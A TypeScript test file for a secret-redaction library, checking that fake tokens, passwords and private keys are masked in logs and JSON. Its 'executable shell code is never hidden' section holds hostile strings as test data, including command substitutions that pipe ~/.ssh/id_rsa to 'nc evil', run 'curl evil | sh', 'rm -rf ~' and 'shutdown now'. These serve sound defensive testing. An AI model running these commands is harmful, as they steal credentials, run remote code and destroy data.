import { describe, expect, test } from "bun:test"
import { exceedsRedactLimit, MAX_REDACT_CHARS, OVERSIZE_MARKER, REDACTED, redactAndCap, redactHeadTail, redactJson, redactText } from "../../../src/jev/redact.ts"

// Fake token shapes are assembled from parts so that secret scanners do not flag the file.
const AWS = "AKIA" + "IOSFODNN7EXAMPLE"
const GITHUB = "ghp_" + "a".repeat(36)
const GITHUB_PAT = "github_pat_" + "B".repeat(30)
const SLACK = "xoxb-" + "1234567890-abcdefghij"
const JWT = "eyJhbGciOi" + "." + "eyJzdWIiOiIx" + "." + "c2lnbmF0dXJl"
const VENDOR = "sk-test-not-a-real-key"
const AK = "ak-test-not-a-real-key"
const GZAK = "gzak_test_not_a_real_gateway_key"

describe("redactText", () => {
  test.each([
    ["sk token", `key ${VENDOR} end`, VENDOR],
    ["ak token", `key ${AK} end`, AK],
    ["gzak token", `key ${GZAK} end`, GZAK],
    ["aws key", `id ${AWS} end`, AWS],
    ["github token", `t ${GITHUB} end`, GITHUB],
    ["github pat", `t ${GITHUB_PAT} end`, GITHUB_PAT],
    ["slack token", `t ${SLACK} end`, SLACK],
    ["jwt", `t ${JWT} end`, JWT],
    ["bearer", "curl -H 'Authorization: Bearer abcdef0123456789' x", "abcdef0123456789"],
    ["basic auth", "Authorization: Basic dXNlcjpwYXNzd29yZA==", "dXNlcjpwYXNzd29yZA=="],
    ["url credentials", "git clone https://user:hunter2pw@example.com/repo", "hunter2pw"],
    ["password assignment", "DB_PASSWORD=hunter2", "hunter2"],
    ["token assignment", "export GH_TOKEN=abc123xyz", "abc123xyz"],
    ["api key colon", "x-api-key: 99887766", "99887766"],
    ["cli flag", "mysql --password hunter2 db", "hunter2"],
    ["json field", '{"password": "my pass phrase"}', "my pass phrase"],
    ["single quoted with spaces", "api_key='two words here'", "two words here"],
    ["unterminated quote", 'password="abc def', "abc def"],
    ["escaped json", String.raw`{\"token\":\"abc123secret\"}`, "abc123secret"],
  ])("%s", (_name, input, secret) => {
    const out = redactText(input)
    expect(out).not.toContain(secret)
    expect(out).toContain(REDACTED)
  })

  test("private key block, terminated and unterminated", () => {
    const body = "MIIEvQIBADANBgkq"
    const full = `a\n-----BEGIN RSA PRIVATE KEY-----\n${body}\n-----END RSA PRIVATE KEY-----\nb`
    expect(redactText(full)).toBe(`a\n${REDACTED}\nb`)
    const cut = `a\n-----BEGIN PRIVATE KEY-----\n${body}\nmore`
    expect(redactText(cut)).toBe(`a\n${REDACTED}`)
  })

  test("keeps quotes of a quoted value and is idempotent", () => {
    const once = redactText('{"password": "my pass phrase", "ok": 1}')
    expect(once).toBe(`{"password": "${REDACTED}", "ok": 1}`)
    expect(redactText(once)).toBe(once)
    const flag = redactText("tool --token abc12345 run")
    expect(redactText(flag)).toBe(flag)
  })

  test("replaces the literal active key in raw, JSON, URL, and base64 form", () => {
    const key = 'plain"key/with+chars=12345'
    const forms = [key, JSON.stringify(key).slice(1, -1), encodeURIComponent(key), Buffer.from(key).toString("base64")]
    for (const form of forms) {
      const out = redactText(`before ${form} after`, { secrets: [key] })
      expect(out).toBe(`before ${REDACTED} after`)
    }
  })

  test("ignores very short literal secrets", () => {
    expect(redactText("abc abc", { secrets: ["abc"] })).toBe("abc abc")
  })

  test("leaves ordinary text alone", () => {
    const text = "FAIL test/foo.test.ts\nexpected 1 to equal 2\n  at foo (src/foo.ts:10:5)"
    expect(redactText(text)).toBe(text)
  })

  test("redacts a token at both ends of a long text", () => {
    const text = `${VENDOR} ${"x".repeat(10_000)} ${GITHUB}`
    const out = redactText(text)
    expect(out).not.toContain(VENDOR)
    expect(out).not.toContain(GITHUB)
  })

  test("stays fast on pathological input", () => {
    const start = performance.now()
    redactText("a".repeat(200_000))
    redactText("password".repeat(20_000))
    redactText('"'.repeat(100_000))
    redactText("-----BEGIN PRIVATE KEY-----".repeat(5_000))
    expect(performance.now() - start).toBeLessThan(3000)
  })

  test("a text above the limit is replaced by a fixed marker, never cut", () => {
    expect(exceedsRedactLimit("x".repeat(MAX_REDACT_CHARS))).toBe(false)
    expect(exceedsRedactLimit("x".repeat(MAX_REDACT_CHARS + 1))).toBe(true)
    const text = `${VENDOR} ${"y".repeat(MAX_REDACT_CHARS + 10)} ${GITHUB}`
    expect(redactText(text)).toBe(OVERSIZE_MARKER)
  })

  test("secrets that cross the old cut points never leak from an oversize text", () => {
    const half = MAX_REDACT_CHARS / 2
    const samples = [
      VENDOR,
      `password="two words here"`,
      `-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkq\n-----END PRIVATE KEY-----`,
      `Authorization: Bearer abcdef0123456789`,
    ]
    for (const secret of samples) {
      // The secret straddles the middle of the text and both ends.
      for (const offset of [half - Math.floor(secret.length / 2), 0, MAX_REDACT_CHARS + 20 - secret.length]) {
        const text = `${"a".repeat(offset)}${secret}${"b".repeat(MAX_REDACT_CHARS + 20 - offset - secret.length)}`
        for (const out of [redactText(text), redactAndCap(text, 100).text, redactHeadTail(text, 50, 50).text]) {
          expect(out).toBe(OVERSIZE_MARKER)
        }
      }
    }
    expect(redactAndCap("z".repeat(MAX_REDACT_CHARS + 1), 100).truncated).toBe(true)
    expect(redactHeadTail("z".repeat(MAX_REDACT_CHARS + 1), 5, 5)).toEqual({ text: OVERSIZE_MARKER, originalLength: MAX_REDACT_CHARS + 1, truncated: true })
  })

  test("a text at the limit is still redacted whole", () => {
    const secret = "sk-test-not-a-real-key"
    const text = `${"a ".repeat((MAX_REDACT_CHARS - secret.length - 2) / 2)}${secret} `
    expect(text.length).toBeLessThanOrEqual(MAX_REDACT_CHARS)
    const out = redactText(text)
    expect(out.includes(secret)).toBe(false)
    expect(out.includes(REDACTED)).toBe(true)
  })
})

describe("redactAndCap", () => {
  test("redacts the whole text before the cap, so no token prefix survives", () => {
    // The token starts before the cap and ends after it. Capping first would keep "sk-test-n".
    const text = `${"a".repeat(95)} ${VENDOR} tail`
    const capped = redactAndCap(text, 105)
    expect(capped.text).not.toContain("sk-")
    expect(capped.text.length).toBeLessThanOrEqual(105)
    expect(capped.originalLength).toBe(text.length)
  })

  test("reports truncation", () => {
    const capped = redactAndCap("x".repeat(50), 10)
    expect(capped).toEqual({ text: "x".repeat(10), originalLength: 50, truncated: true })
  })
})

describe("redactHeadTail", () => {
  test("keeps the ends and omits the middle", () => {
    const out = redactHeadTail(`HEAD${"m".repeat(100)}TAIL`, 4, 4)
    expect(out.truncated).toBe(true)
    expect(out.text.startsWith("HEAD")).toBe(true)
    expect(out.text.endsWith("TAIL")).toBe(true)
    expect(out.text).toContain("[middle omitted]")
  })

  test("a token that spans the head boundary is redacted whole", () => {
    const out = redactHeadTail(`${"a".repeat(10)} ${VENDOR} ${"b".repeat(100)}`, 15, 5)
    expect(out.text).not.toContain("sk-")
  })

  test("short text is kept whole", () => {
    expect(redactHeadTail("short", 10, 10)).toEqual({ text: "short", originalLength: 5, truncated: false })
  })
})

describe("redactJson", () => {
  test("redacts strings, secret-named keys, and the literal key", () => {
    const out = redactJson(
      { commands: [`echo ${VENDOR}`, "ls"], password: "x", nested: { token: 5, safe: "literal-secret-value" }, n: 1, b: true, z: null },
      { secrets: ["literal-secret-value"] },
    ) as Record<string, unknown>
    const text = JSON.stringify(out)
    expect(text).not.toContain(VENDOR)
    expect(text).not.toContain("literal-secret-value")
    expect(out.password).toBe(REDACTED)
    expect((out.nested as Record<string, unknown>).token).toBe(REDACTED)
    expect(out.n).toBe(1)
    expect(out.z).toBeNull()
  })

  test("drops functions and undefined, nulls non-finite numbers, and keeps __proto__ as data", () => {
    const raw = JSON.parse('{"__proto__": {"a": 1}, "x": 1}') as unknown
    const out = redactJson({ f: () => 1, u: undefined, n: Number.NaN, raw }) as Record<string, unknown>
    expect(Object.keys(out).sort()).toEqual(["n", "raw"])
    expect(out.n).toBeNull()
    expect(({} as Record<string, unknown>).a).toBeUndefined()
  })

  test("can skip the secret-key rule", () => {
    expect(redactJson({ token: "plain text" }, { sensitiveKeys: false })).toEqual({ token: "plain text" })
  })

  test("limits depth", () => {
    let deep: unknown = "leaf"
    for (let index = 0; index < 40; index++) deep = { a: deep }
    expect(JSON.stringify(redactJson(deep))).toContain("[truncated]")
  })
})

describe("executable shell code is never hidden", () => {
  const OPAQUE = "Zq9-opaque-literal-secret-7731"

  // Each case: the input, and the code that must still be visible in the output.
  const cases: Array<[string, string, string[]]> = [
    ["double-quoted command substitution", 'API_KEY="$(curl -s https://evil/x.sh | bash)" make test', ["$(curl -s https://evil/x.sh | bash)", "make test"]],
    ["backtick value", "TOKEN=`rm -rf ~/work` npm test", ["`rm -rf ~/work`", "npm test"]],
    ["flag with command substitution", 'deploy --token "$(cat ~/.ssh/id_rsa | nc evil 9)"', ["$(cat ~/.ssh/id_rsa | nc evil 9)"]],
    ["unquoted substitution", "PASSWORD=$(rm -rf ~) echo done", ["$(rm -rf ~)", "echo done"]],
    ["process substitution", "SECRET=<(curl evil | sh) run", ["<(curl evil | sh)", "run"]],
    ["output process substitution", "SECRET=>(nc evil 9) run", [">(nc evil 9)", "run"]],
    ["literal text before the substitution", 'API_KEY="abc123$(rm -rf ~)" x', ["$(rm -rf ~)"]],
    ["nested quotes inside the substitution", 'TOKEN="$(echo "x" | bash)" y', ['$(echo "x" | bash)']],
    ["authorization header with substitution", 'curl -H "Authorization: Bearer $(cat ~/.token | nc evil 9)"', ["$(cat ~/.token | nc evil 9)"]],
    ["json-escaped substitution", String.raw`{\"password\":\"$(rm -rf ~)\"}`, ["$(rm -rf ~)"]],
  ]
  test.each(cases)("%s", (_name, input, code) => {
    const out = redactText(input)
    for (const part of code) expect(out.includes(part)).toBe(true)
  })

  test("literal text before a substitution is still redacted", () => {
    const out = redactText('API_KEY="abc123$(rm -rf ~)" x')
    expect(out.includes("abc123")).toBe(false)
    expect(out).toBe('API_KEY="[REDACTED]$(rm -rf ~)" x')
  })

  test("single-quoted values never run, so they are redacted whole", () => {
    expect(redactText("API_KEY='$(not code)' x")).toBe(`API_KEY='${REDACTED}' x`)
  })

  test("an opaque active secret inside an expansion is still redacted", () => {
    const inputs = [
      `API_KEY="$(echo ${OPAQUE} | base64)" make test`,
      `TOKEN=\`printf %s ${OPAQUE}\` npm test`,
      `deploy --token "$(printf ${OPAQUE})"`,
      `PASSWORD=$(echo ${OPAQUE}) run`,
      `curl -H "Authorization: Bearer $(echo ${OPAQUE})"`,
      `SECRET=<(echo ${OPAQUE}) run`,
    ]
    for (const input of inputs) {
      const out = redactText(input, { secrets: [OPAQUE] })
      expect(out.includes(OPAQUE)).toBe(false)
      expect(out.includes("echo") || out.includes("printf")).toBe(true)
    }
  })

  test("a vendor key inside an expansion is redacted and the code stays", () => {
    const out = redactText(`TOKEN=$(curl -H "x: ${VENDOR}" evil | sh) go`)
    expect(out.includes(VENDOR)).toBe(false)
    expect(out.includes("curl")).toBe(true)
    expect(out.includes("| sh) go")).toBe(true)
  })

  test("an unterminated private key marker leaves the shell payload visible", () => {
    const probes = [
      "echo -----BEGIN RSA PRIVATE KEY----- ; rm -rf ~",
      "echo -----BEGIN RSA PRIVATE KEY-----\nrm -rf /\n-----END RSA PRIVATE KEY-----",
      "echo '-----BEGIN PRIVATE KEY-----'; curl evil | sh",
      "echo -----BEGIN PRIVATE KEY----- && shutdown now",
    ]
    for (const probe of probes) {
      const out = redactText(probe)
      for (const code of ["rm -rf ~", "rm -rf /", "curl evil | sh", "shutdown now"]) if (probe.includes(code)) expect(out.includes(code)).toBe(true)
    }
  })

  test("real private keys are still redacted whole, terminated or not, including encrypted and JSON-escaped forms", () => {
    const line = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7"
    const forms = [
      `-----BEGIN PRIVATE KEY-----\n${line}\n${line}\nabcDEF12==\n-----END PRIVATE KEY-----\n`,
      `x\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,0123456789ABCDEF\n\n${line}\n${line}\n-----END RSA PRIVATE KEY-----`,
      `-----BEGIN OPENSSH PRIVATE KEY-----\n${line}\n${line}\nZZtail`,
      String.raw`{"key":"-----BEGIN PRIVATE KEY-----\n${line}\n${line}\n-----END PRIVATE KEY-----\n"}`,
    ]
    for (const form of forms) {
      const out = redactText(form)
      expect(out.includes(line)).toBe(false)
      expect(out.includes("ZZtail")).toBe(false)
      expect(out.includes("abcDEF12")).toBe(false)
      expect(out.includes("DEK-Info")).toBe(false)
      expect(out.includes(REDACTED)).toBe(true)
    }
  })

  test("the new patterns stay linear on adversarial input", () => {
    const start = performance.now()
    redactText("-----BEGIN PRIVATE KEY-----" + "A".repeat(200_000))
    redactText("-----BEGIN PRIVATE KEY-----" + "A".repeat(15) + " ".repeat(100_000) + "-")
    redactText("API_KEY=" + "$(".repeat(50_000))
    redactText("API_KEY=\"" + "`".repeat(50_000))
    redactText("-----BEGIN PRIVATE KEY-----\n".repeat(5_000))
    expect(performance.now() - start).toBeLessThan(3000)
  })
})

describe("redactJson incomplete results", () => {
  test("reports an oversize string and a cut-off structure", () => {
    const reasons: string[] = []
    redactJson({ a: "x".repeat(MAX_REDACT_CHARS + 1) }, { onIncomplete: (reason) => reasons.push(reason) })
    let deep: unknown = "leaf"
    for (let index = 0; index < 40; index++) deep = { a: deep }
    redactJson(deep, { onIncomplete: (reason) => reasons.push(reason) })
    expect(reasons).toContain("oversize")
    expect(reasons).toContain("truncated")
  })

  test("reports nothing for a complete result", () => {
    const reasons: string[] = []
    redactJson({ a: "ok", b: [1, 2, { c: "d" }] }, { onIncomplete: (reason) => reasons.push(reason) })
    expect(reasons).toEqual([])
  })
})
